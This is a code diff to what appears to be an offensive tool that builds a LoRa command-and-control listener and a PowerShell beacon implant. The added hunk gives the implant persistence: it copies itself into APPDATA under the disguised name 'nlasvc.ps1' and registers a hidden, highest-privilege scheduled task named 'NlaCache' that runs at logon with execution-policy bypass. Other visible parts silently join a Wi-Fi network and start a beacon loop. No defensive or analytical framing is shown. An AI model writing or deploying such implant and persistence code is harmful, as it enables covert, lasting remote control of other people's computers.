@@ -218,7 +218,7 @@ def _lora_listener_script(serial_port: str, baud: int, freq_mhz: float) -> str:
         "            cmd = input('cmd> ').strip()\n"
         "            if cmd:\n"
         "                ser.write(f'C:{cmd}\\n'.encode())\n"
-        "                print(f'[*] sent → {cmd}')\n"
+        "                print(f'[*] sent -> {cmd}')\n"
         "    except (KeyboardInterrupt, EOFError): pass\n"
         "    finally:\n"
         "        stop.set()\n"
@@ -280,6 +280,19 @@ netsh wlan add profile filename="$TmpXml" 2>$null | Out-Null
 Remove-Item $TmpXml -Force -EA SilentlyContinue
 netsh wlan connect name="$LoraSSID" 2>$null | Out-Null
 Start-Sleep 5
+
+# ── Persist via scheduled task (beacon survives PS process exit) ─────────────
+$_lp = "$env:APPDATA\Microsoft\Network\nlasvc.ps1"
+if ($PSCommandPath -and (-not (Test-Path $_lp))) {
+    Copy-Item $PSCommandPath $_lp -Force -EA SilentlyContinue
+}
+if (Test-Path $_lp) {
+    $_ta = New-ScheduledTaskAction -Execute 'powershell.exe' `
+            -Argument "-ep bypass -WindowStyle Hidden -NonInteractive -File `"$_lp`""
+    $_tt = New-ScheduledTaskTrigger -AtLogOn
+    Register-ScheduledTask -TaskName 'NlaCache' -Action $_ta -Trigger $_tt `
+                           -RunLevel Highest -Force -EA SilentlyContinue | Out-Null
+}
 
 # ── Beacon loop in a detached runspace (non-blocking) ──────────────────────
 $Rs = [System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspace()
